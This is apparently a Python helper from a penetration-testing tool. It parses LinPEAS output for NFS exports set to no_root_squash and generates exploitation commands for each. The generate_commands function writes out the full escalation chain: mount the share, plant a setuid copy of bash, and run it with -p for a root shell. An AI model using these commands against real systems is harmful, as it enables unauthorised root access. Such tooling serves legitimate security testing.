"""Detect NFS no_root_squash privilege escalation from LinPEAS output."""

import re
from typing import Dict, List

# Strip file-path prefix like "/etc/exports: " from LinPEAS output lines
_PREFIX_RE = re.compile(r"^[^\s:]+:\s+")

# Matches NFS export lines containing no_root_squash:
#   /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
#   /home/user *(rw,no_root_squash)
_EXPORT_RE = re.compile(r"(/\S+)\s+[\*\w].*no_root_squash", re.IGNORECASE)


def parse_nfs_section(section_text: str) -> List[str]:
    """Extract NFS export paths with no_root_squash from LinPEAS section text."""
    paths: List[str] = []
    seen: set = set()

    for raw_line in section_text.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        # Strip optional "filepath: " prefix (e.g. "/etc/exports: /path ...")
        line = _PREFIX_RE.sub("", line)
        m = _EXPORT_RE.match(line)
        if not m:
            continue
        path = m.group(1)
        if path not in seen:
            seen.add(path)
            paths.append(path)

    return paths


def generate_commands(export_path: str) -> List[str]:
    """Generate NFS no_root_squash exploitation steps.

    Steps 1-2 run on the attacker machine (as root); step 3 runs on the target.
    Replace LHOST with the target machine IP.
    """
    return [
        f"mkdir /tmp/nfs_mount && mount -t nfs LHOST:{export_path} /tmp/nfs_mount",
        f"cp /bin/bash /tmp/nfs_mount/rootbash && chmod +s /tmp/nfs_mount/rootbash",
        f"{export_path}/rootbash -p",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze NFS section for no_root_squash privilege escalation.

    Returns a CRITICAL finding for each export path with no_root_squash.
    """
    findings: List[Dict] = []

    for export_path in parse_nfs_section(section_text):
        findings.append({
            "export_path": export_path,
            "severity": "CRITICAL",
            "type": "nfs",
            "commands": generate_commands(export_path),
        })

    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/etc/exports: /home/user *(rw,no_root_squash)
No root squash:
/etc/exports: /opt/share *(rw,sync,no_root_squash)
# regular entry (should be ignored):
/mnt/safe *(rw,root_squash)
"""

    print("=== parse_nfs_section ===")
    paths = parse_nfs_section(SAMPLE)
    print("Paths:", paths)

    print("\n=== analyze ===")
    for finding in analyze(SAMPLE):
        cmds = finding["commands"]
        print(f"[{finding['severity']}] {finding['type']} -> {finding['export_path']}  ({len(cmds)} cmd(s))")
        for cmd in cmds:
            print(f"  $ {cmd}")
